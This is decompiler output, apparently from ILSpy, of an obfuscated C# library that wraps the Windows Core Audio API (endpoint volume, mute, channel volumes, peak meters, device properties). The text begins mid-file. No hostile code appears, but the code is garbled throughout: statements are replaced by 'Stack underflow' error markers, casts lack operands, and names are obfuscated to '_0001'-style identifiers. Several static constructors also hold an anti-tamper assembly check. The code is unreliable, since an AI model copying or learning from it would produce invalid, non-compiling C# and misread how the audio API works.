		_0003,
		_0004,
		_0005,
		_0006,
		_0007,
		_0008
	}
}
namespace _000E
{
	internal sealed class _001A : IDisposable
	{
		internal global::_0014._0013 _0001;

		public int ChannelCount
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_001A)/*Error near IL_000c: Stack underflow*/)._0001._0001(out var result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return (int)result;
			}
		}

		internal _001A(global::_0014._0013 _0095_0091_0006)
		{
			this._0001 = _0095_0091_0006;
		}

		internal void _0001(int _0002, string _0003)
		{
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			_ = ((_001A)/*Error near IL_0037: Stack underflow*/).ChannelCount;
			int num = default(int);
			if (0 == 0)
			{
				num = (int)/*Error near IL_003a: Stack underflow*/;
			}
			if (_0002 >= num)
			{
				throw new ArgumentOutOfRangeException(_0003, global::_000F._008B_0002(_0080._0014._0001(107406713), num.ToString()));
			}
		}

		public void _0001(float[] _0002)
		{
			//IL_00ff: Incompatible stack heights: 0 vs 1
			//IL_0109: Incompatible stack heights: 0 vs 1
			_ = ((_001A)/*Error near IL_0109: Stack underflow*/).ChannelCount;
			int num = (int)/*Error near IL_010f: Stack underflow*/;
			if (_0002 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107406620));
			}
			if (_0002.Length != num)
			{
				throw new ArgumentOutOfRangeException(_0080._0014._0001(107406620), _0096._0087_0004(_008F_0003._008B_0007(), _0080._0014._0001(107406611), new object[2] { num, _0002.Length }));
			}
			for (int i = 0; i < _0002.Length; i++)
			{
				float num2 = _0002[i];
				if (num2 < 0f)
				{
					throw new ArgumentOutOfRangeException(_0080._0014._0001(107406620), global::_000F._008B_0002(_0080._0014._0001(107405889), i.ToString()));
				}
				if (num2 > 1f)
				{
					throw new ArgumentOutOfRangeException(_0080._0014._0001(107406620), global::_000F._008B_0002(_0080._0014._0001(107405889), i.ToString()));
				}
			}
			global::_0007._0097(this._0001._0001((uint)num, _0002));
		}

		public void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			((_001A)/*Error near IL_001a: Stack underflow*/)._0001(_0002: true);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected virtual void _0001(bool _0002)
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_001A)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				_ = _0098._008A_0004;
				global::_0014._0013 obj = ((_001A)/*Error near IL_0019: Stack underflow*/)._0001;
				/*Error near IL_001e: Stack underflow*/(obj);
				this._0001 = null;
			}
		}
	}
	internal sealed class _001B
	{
		private readonly Guid _0001;

		private readonly bool _0001;

		private readonly float _0001;

		private readonly int _0001;

		private readonly float[] _0001;

		private readonly Guid _0002;

		public Guid EventContext => ((_001B)/*Error near IL_0007: Stack underflow*/)._0001;

		public bool Muted => ((_001B)/*Error near IL_0007: Stack underflow*/)._0001;

		public Guid Guid => ((_001B)/*Error near IL_0007: Stack underflow*/)._0002;

		public float MasterVolume => ((_001B)/*Error near IL_0007: Stack underflow*/)._0001;

		public int Channels => ((_001B)/*Error near IL_0007: Stack underflow*/)._0001;

		public float[] ChannelVolume => ((_001B)/*Error near IL_0007: Stack underflow*/)._0001;

		public _001B(Guid _0096_0091_0006, bool _0097_0091_0006, float _0098_0091_0006, float[] _0099_0091_0006, Guid _009A_0091_0006)
		{
			this._0001 = _0096_0091_0006;
			this._0001 = _0097_0091_0006;
			this._0001 = _0098_0091_0006;
			this._0001 = _0099_0091_0006.Length;
			_0001 = _0099_0091_0006;
			_0002 = _009A_0091_0006;
		}

		static _001B()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0019
{
	internal sealed class _0015 : IEnumerable, IEnumerable<global::_0010._0019>
	{
		private global::_0017._001E m__0001;

		public int Count
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0015)/*Error near IL_000c: Stack underflow*/).m__0001._0001(out var result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
		}

		public global::_0010._0019 this[int _0002]
		{
			get
			{
				//IL_0016: Incompatible stack heights: 0 vs 1
				//IL_0019: Incompatible stack heights: 0 vs 2
				//IL_0020: Incompatible stack heights: 0 vs 1
				_ = ((_0015)/*Error near IL_0007: Stack underflow*/).m__0001;
				((global::_0017._001E)/*Error near IL_0020: Stack underflow*/)._0001((int)/*Error near IL_0020: Stack underflow*/, out global::_0018._0018 obj);
				return new global::_0010._0019(obj);
			}
		}

		internal _0015(global::_0017._001E _0083_0019)
		{
			this.m__0001 = _0083_0019;
		}

		public IEnumerator<global::_0010._0019> _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 3
			new _0001(0);
			((_0001)/*Error near IL_000e: Stack underflow*/)._0001 = (_0015)/*Error near IL_000e: Stack underflow*/;
			return (IEnumerator<global::_0010._0019>)/*Error near IL_000f: Stack underflow*/;
		}

		IEnumerator<global::_0010._0019> IEnumerable<global::_0010._0019>.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001();
		}

		private IEnumerator _0001()
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			((_0015)/*Error near IL_000d: Stack underflow*/)._0001();
			return (IEnumerator)/*Error near IL_0005: Stack underflow*/;
		}

		IEnumerator IEnumerable.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0001();
		}
	}
}
namespace _0010
{
	internal sealed class _0019
	{
		internal readonly global::_0018._0018 _0001;

		internal global::_0015._0013 _0001;

		internal _0018 _0001;

		internal global::_0080._0011 _0001;

		internal global::_0017._001B _0001;

		internal static Guid _0001;

		internal static Guid _0002;

		internal static Guid _0003;

		internal static Guid _0004;

		public global::_0007._0014 AudioClient
		{
			get
			{
				//IL_0006: Incompatible stack heights: 0 vs 1
				//IL_000d: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0019)/*Error near IL_000d: Stack underflow*/);
				return (global::_0007._0014)/*Error near IL_0005: Stack underflow*/;
			}
		}

		public _0018 AudioMeterInformation
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((_0019)/*Error near IL_001f: Stack underflow*/);
				}
				return this._0001;
			}
		}

		public global::_0080._0011 AudioEndpointVolume
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((_0019)/*Error near IL_001f: Stack underflow*/);
				}
				return this._0001;
			}
		}

		public global::_0017._001B AudioSessionManager
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((_0019)/*Error near IL_001f: Stack underflow*/);
				}
				return this._0001;
			}
		}

		public global::_0015._0013 Properties
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((_0019)/*Error near IL_001f: Stack underflow*/);
				}
				return this._0001;
			}
		}

		public string FriendlyName
		{
			get
			{
				//IL_0046: Incompatible stack heights: 0 vs 1
				//IL_0049: Incompatible stack heights: 0 vs 1
				if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((_0019)/*Error near IL_0050: Stack underflow*/);
				}
				if (global::_0011._0018._0001(this._0001, global::_0002._0015._0012))
				{
					return (string)this._0001[global::_0002._0015._0012].Value;
				}
				return global::_0080._0014._0001(107406262);
			}
		}

		public string DeviceFriendlyName
		{
			get
			{
				//IL_0046: Incompatible stack heights: 0 vs 1
				//IL_0049: Incompatible stack heights: 0 vs 1
				if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((_0019)/*Error near IL_0050: Stack underflow*/);
				}
				if (global::_0011._0018._0001(this._0001, global::_0002._0015._0001))
				{
					return (string)this._0001[global::_0002._0015._0001].Value;
				}
				return global::_0080._0014._0001(107406262);
			}
		}

		public string IconPath
		{
			get
			{
				//IL_0046: Incompatible stack heights: 0 vs 1
				//IL_0049: Incompatible stack heights: 0 vs 1
				if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((_0019)/*Error near IL_0050: Stack underflow*/);
				}
				if (global::_0011._0018._0001(this._0001, global::_0002._0015._0013))
				{
					return (string)this._0001[global::_0002._0015._0013].Value;
				}
				return global::_0080._0014._0001(107406262);
			}
		}

		public string ID
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0019)/*Error near IL_000c: Stack underflow*/)._0001._0001(out string result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
		}

		public global::_0016._0019 DataFlow
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_001f: Incompatible stack heights: 0 vs 1
				(((_0019)/*Error near IL_0007: Stack underflow*/)._0001 as global::_0004._0013)._0001(out var _);
				return (global::_0016._0019)/*Error near IL_0014: Stack underflow*/;
			}
		}

		public global::_0003._0010 State
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0019)/*Error near IL_000c: Stack underflow*/)._0001._0001(out global::_0003._0010 result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
		}

		internal _0019(global::_0018._0018 _0003_0092_0006)
		{
			this._0001 = _0003_0092_0006;
		}

		public override string _0005()
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			_ = ((_0019)/*Error near IL_000d: Stack underflow*/).FriendlyName;
			return (string)/*Error near IL_0005: Stack underflow*/;
		}

		static _0019()
		{
			//IL_0109: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_010f: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				throw new SecurityException(global::_0080._0014._0001(107396706));
			}
			_0001 = new Guid(global::_0080._0014._0001(107406217));
			_0002 = new Guid(global::_0080._0014._0001(107406200));
			_0003 = new Guid(global::_0080._0014._0001(107406119));
			_0004 = new Guid(global::_0080._0014._0001(107406102));
		}
	}
}
namespace _0002
{
	internal static class _0015
	{
		public static readonly global::_0006._0012 _0001;

		public static readonly global::_0006._0012 _0002;

		public static readonly global::_0006._0012 _0003;

		public static readonly global::_0006._0012 _0004;

		public static readonly global::_0006._0012 _0005;

		public static readonly global::_0006._0012 _0006;

		public static readonly global::_0006._0012 _0007;

		public static readonly global::_0006._0012 _0008;

		public static readonly global::_0006._0012 _000E;

		public static readonly global::_0006._0012 _000F;

		public static readonly global::_0006._0012 _0010;

		public static readonly global::_0006._0012 _0011;

		public static readonly global::_0006._0012 _0012;

		public static readonly global::_0006._0012 _0013;

		static _0015()
		{
			//IL_0411: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_0417: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_0001 = new global::_0006._0012(new Guid(40784238, -18412, 16715, 131, 205, 133, 109, 111, 239, 72, 34), 2);
			_0002 = new global::_0006._0012(new Guid(497408003, -11118, 20189, 140, 35, 224, 192, byte.MaxValue, 238, 127, 14), 0);
			_0003 = new global::_0006._0012(new Guid(497408003, -11118, 20189, 140, 35, 224, 192, byte.MaxValue, 238, 127, 14), 1);
			_0004 = new global::_0006._0012(new Guid(497408003, -11118, 20189, 140, 35, 224, 192, byte.MaxValue, 238, 127, 14), 2);
			_0005 = new global::_0006._0012(new Guid(497408003, -11118, 20189, 140, 35, 224, 192, byte.MaxValue, 238, 127, 14), 3);
			_0006 = new global::_0006._0012(new Guid(497408003, -11118, 20189, 140, 35, 224, 192, byte.MaxValue, 238, 127, 14), 4);
			_0007 = new global::_0006._0012(new Guid(497408003, -11118, 20189, 140, 35, 224, 192, byte.MaxValue, 238, 127, 14), 5);
			_0008 = new global::_0006._0012(new Guid(497408003, -11118, 20189, 140, 35, 224, 192, byte.MaxValue, 238, 127, 14), 6);
			_000E = new global::_0006._0012(new Guid(497408003, -11118, 20189, 140, 35, 224, 192, byte.MaxValue, 238, 127, 14), 7);
			_000F = new global::_0006._0012(new Guid(497408003, -11118, 20189, 140, 35, 224, 192, byte.MaxValue, 238, 127, 14), 8);
			_0010 = new global::_0006._0012(new Guid(-241236403, 2092, 20007, 188, 115, 104, 130, 161, 187, 142, 76), 0);
			_0011 = new global::_0006._0012(new Guid(-460911066, 15557, 19666, 186, 70, 202, 10, 154, 112, 237, 4), 3);
			_0012 = new global::_0006._0012(new Guid(-1537465010, -8420, 20221, 128, 32, 103, 209, 70, 168, 80, 224), 14);
			_0013 = new global::_0006._0012(new Guid(630898684, 20647, 18382, 175, 8, 104, 201, 167, 215, 51, 102), 12);
		}
	}
}
namespace _0005
{
	internal sealed class _0015
	{
		private readonly global::_0008._000F _0001;

		public _001B._0014 this[int _0002]
		{
			get
			{
				//IL_001f: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 2
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				_ = ((_0015)/*Error near IL_000c: Stack underflow*/)._0001;
				((global::_0008._000F)/*Error near IL_0029: Stack underflow*/)._0001((int)/*Error near IL_0029: Stack underflow*/, out global::_0018._0017 obj);
				/*Error near IL_0017: Stack underflow*/((int)/*Error near IL_0017: Stack underflow*/);
				return new _001B._0014(obj);
			}
		}

		public int Count
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0015)/*Error near IL_000c: Stack underflow*/)._0001._0001(out var result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
		}

		internal _0015(global::_0008._000F _009B_0091_0006)
		{
			_0001 = _009B_0091_0006;
		}
	}
}
namespace _0010
{
	internal sealed class _0017 : IDisposable
	{
		private readonly global::_001F._0016 m__0001;

		public float Volume
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0017)/*Error near IL_000c: Stack underflow*/).m__0001._0001(out float result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
			set
			{
				//IL_003a: Incompatible stack heights: 0 vs 1
				//IL_003d: Incompatible stack heights: 0 vs 1
				//IL_0040: Incompatible stack heights: 0 vs 2
				if ((double)/*Error near IL_0003: Stack underflow*/ >= 0.0 && (double)/*Error near IL_0011: Stack underflow*/ <= 1.0)
				{
					_ = global::_0007._0097;
					int num = ((_0017)/*Error near IL_0028: Stack underflow*/).m__0001._0001(value, Guid.Empty);
					/*Error near IL_0038: Stack underflow*/(num);
				}
			}
		}

		public bool Mute
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0017)/*Error near IL_000c: Stack underflow*/).m__0001._0001(out bool result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
			set
			{
				//IL_001c: Incompatible stack heights: 0 vs 2
				//IL_001f: Incompatible stack heights: 0 vs 2
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				_ = ((_0017)/*Error near IL_000c: Stack underflow*/).m__0001;
				Guid empty = Guid.Empty;
				((global::_001F._0016)/*Error near IL_0026: Stack underflow*/)._0001((byte)/*Error near IL_0026: Stack underflow*/ != 0, empty);
				/*Error near IL_001a: Stack underflow*/((int)/*Error near IL_001a: Stack underflow*/);
			}
		}

		internal _0017(global::_001F._0016 _009C_0091_0006)
		{
			this.m__0001 = _009C_0091_0006;
		}

		public void _0001()
		{
			//IL_000b: Incompatible stack heights: 0 vs 2
			_ = _0091_0002._009B_0005;
			/*Error near IL_0012: Stack underflow*/((object)/*Error near IL_0012: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected override void _0002()
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			try
			{
				((_0017)/*Error near IL_000e: Stack underflow*/)._0001();
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		static _0017()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _001F
{
	internal enum _0014
	{
		_0001,
		_0002,
		_0003,
		_0004
	}
}
namespace _0080
{
	internal sealed class _0011 : IDisposable
	{
		internal readonly global::_0006._0014 _0001;

		private readonly global::_0005._0013 m__0001;

		private readonly global::_0007._0015 m__0001;

		private readonly global::_0010._0015 m__0001;

		private readonly _0012 m__0001;

		private _0019._0014 m__0001;

		internal Guid _0001 = Guid.Empty;

		[CompilerGenerated]
		internal global::_0017._001A _0001;

		public Guid NotificationGuid
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0011)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0011)/*Error near IL_0009: Stack underflow*/)._0001 = (Guid)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0010._0015 VolumeRange => ((_0011)/*Error near IL_0007: Stack underflow*/).m__0001;

		public _0012 HardwareSupport => ((_0011)/*Error near IL_0007: Stack underflow*/).m__0001;

		public global::_0007._0015 StepInformation => ((_0011)/*Error near IL_0007: Stack underflow*/).m__0001;

		public global::_0005._0013 Channels => ((_0011)/*Error near IL_0007: Stack underflow*/).m__0001;

		public float MasterVolumeLevel
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0011)/*Error near IL_000c: Stack underflow*/)._0001._0001(out float result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
			set
			{
				//IL_0021: Incompatible stack heights: 0 vs 2
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				_ = ((_0011)/*Error near IL_000c: Stack underflow*/)._0001;
				ref Guid reference = ref ((_0011)/*Error near IL_0015: Stack underflow*/)._0001;
				int num = ((global::_0006._0014)/*Error near IL_001a: Stack underflow*/)._0001((float)/*Error near IL_001a: Stack underflow*/, ref reference);
				/*Error near IL_001f: Stack underflow*/(num);
			}
		}

		public float MasterVolumeLevelScalar
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0011)/*Error near IL_000c: Stack underflow*/)._0001._0002(out var result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
			set
			{
				//IL_0021: Incompatible stack heights: 0 vs 2
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				_ = ((_0011)/*Error near IL_000c: Stack underflow*/)._0001;
				ref Guid reference = ref ((_0011)/*Error near IL_0015: Stack underflow*/)._0001;
				int num = ((global::_0006._0014)/*Error near IL_001a: Stack underflow*/)._0002((float)/*Error near IL_001a: Stack underflow*/, ref reference);
				/*Error near IL_001f: Stack underflow*/(num);
			}
		}

		public bool Mute
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0011)/*Error near IL_000c: Stack underflow*/)._0001._0001(out bool result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
			set
			{
				//IL_0021: Incompatible stack heights: 0 vs 2
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				_ = ((_0011)/*Error near IL_000c: Stack underflow*/)._0001;
				ref Guid reference = ref ((_0011)/*Error near IL_0015: Stack underflow*/)._0001;
				int num = ((global::_0006._0014)/*Error near IL_001a: Stack underflow*/)._0001((byte)/*Error near IL_001a: Stack underflow*/ != 0, ref reference);
				/*Error near IL_001f: Stack underflow*/(num);
			}
		}

		public event global::_0017._001A OnVolumeNotification
		{
			[CompilerGenerated]
			add
			{
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				global::_0017._001A obj = ((_0011)/*Error near IL_0007: Stack underflow*/)._0001;
				global::_0017._001A obj2;
				do
				{
					obj2 = (global::_0017._001A)/*Error near IL_000c: Stack underflow*/;
					global::_0017._001A value2 = (global::_0017._001A)_0005_0002._009F_0004(obj2, value);
					obj = Interlocked.CompareExchange(ref this._0001, value2, obj2);
				}
				while ((object)obj != obj2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				global::_0017._001A obj = ((_0011)/*Error near IL_0007: Stack underflow*/)._0001;
				global::_0017._001A obj2;
				do
				{
					obj2 = (global::_0017._001A)/*Error near IL_000c: Stack underflow*/;
					global::_0017._001A value2 = (global::_0017._001A)_0005_0002._0001_0005(obj2, value);
					obj = Interlocked.CompareExchange(ref this._0001, value2, obj2);
				}
				while ((object)obj != obj2);
			}
		}

		internal _0011(global::_0006._0014 _009E_0091_0006)
		{
			this._0001 = _009E_0091_0006;
			this.m__0001 = new global::_0005._0013(this._0001);
			this.m__0001 = new global::_0007._0015(this._0001);
			Marshal.ThrowExceptionForHR(this._0001._0001(out uint num));
			this.m__0001 = (_0012)num;
			this.m__0001 = new global::_0010._0015(this._0001);
			this.m__0001 = new _0019._0014(this);
			Marshal.ThrowExceptionForHR(this._0001._0001(this.m__0001));
		}

		public void _0001()
		{
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0040: Incompatible stack heights: 0 vs 2
			if (((_0011)/*Error near IL_0007: Stack underflow*/).m__0001 != null)
			{
				_ = global::_0007._0097;
				_ = ((_0011)/*Error near IL_0015: Stack underflow*/)._0001;
				_0019._0014 obj = ((_0011)/*Error near IL_001c: Stack underflow*/).m__0001;
				int num = ((global::_0006._0014)/*Error near IL_0021: Stack underflow*/)._0002((global::_0017._001C)obj);
				/*Error near IL_0026: Stack underflow*/(num);
				this.m__0001 = null;
			}
			_0091_0002._009B_0005(this);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected override void _0002()
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			try
			{
				((_0011)/*Error near IL_000e: Stack underflow*/)._0001();
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		static _0011()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0014._0001(107396751), _0014._0001(107396746)), _0014._0001(107396741), _0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0014._0001(107396706));
		}
	}
}
namespace _0010
{
	internal sealed class _0018
	{
		private readonly global::_0002._0016 _0001;

		private readonly global::_0080._0012 _0001;

		private readonly global::_001C._0011 _0001;

		public global::_001C._0011 PeakValues => ((_0018)/*Error near IL_0007: Stack underflow*/)._0001;

		public global::_0080._0012 HardwareSupport => ((_0018)/*Error near IL_0007: Stack underflow*/)._0001;

		public float MasterPeakValue
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0018)/*Error near IL_000c: Stack underflow*/)._0001._0001(out float result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
		}

		internal _0018(global::_0002._0016 _009F_0091_0006)
		{
			this._0001 = _009F_0091_0006;
			Marshal.ThrowExceptionForHR(this._0001._0002(out var num));
			this._0001 = (global::_0080._0012)num;
			_0001 = new global::_001C._0011(this._0001);
		}
	}
}
namespace _0003
{
	[Flags]
	internal enum _0010
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 4,
		_0004 = 8,
		_0005 = 0xF
	}
}
namespace _0080
{
	[Flags]
	internal enum _0012
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 4
	}
}
namespace _0016
{
	internal enum _0019
	{
		_0001,
		_0002,
		_0003
	}
}
namespace _0006
{
	internal struct _0012
	{
		public Guid _0001;

		public int _0001;

		public _0012(Guid _0001_0092_0006, int _0002_0092_0006)
		{
			this._0001 = _0001_0092_0006;
			_0001 = _0002_0092_0006;
		}
	}
}
namespace _0019
{
	internal enum _0016
	{
		_0001,
		_0002,
		_0003
	}
}
namespace _001F
{
	internal sealed class _0015 : IDisposable
	{
		internal global::_0006._0015 _0001;

		public _0015()
		{
			if (Environment.OSVersion.Version.Major < 6)
			{
				throw new NotSupportedException(_0080._0014._0001(107405509));
			}
			this._0001 = new global::_0007._0017() as global::_0006._0015;
		}

		public void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			((_0015)/*Error near IL_001a: Stack underflow*/)._0001(_0002: true);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected virtual void _0001(bool _0002)
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0015)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				_ = _0098._008A_0004;
